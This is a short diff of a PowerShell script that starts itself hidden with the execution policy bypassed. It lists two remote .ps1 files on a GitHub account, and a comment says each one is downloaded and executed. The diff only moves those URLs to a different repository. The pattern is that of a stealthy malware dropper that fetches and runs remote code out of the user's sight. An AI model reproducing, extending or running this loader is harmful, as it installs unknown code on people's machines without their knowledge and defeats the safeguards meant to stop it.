@@ -1,8 +1,8 @@
 cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
 # URLs of the files to download
 $urls = @(
-    "https://github.com/KevinDark5/taproject/raw/refs/heads/main/rnk.ps1",
-    "https://github.com/KevinDark5/taproject/raw/refs/heads/main/pynk.ps1"
+    "https://github.com/KevinDark5/data/raw/refs/heads/main/rnk.ps1",
+    "https://github.com/KevinDark5/data/raw/refs/heads/main/pynk.ps1"
 )
 
 # Download and execute each file with Bypass policy
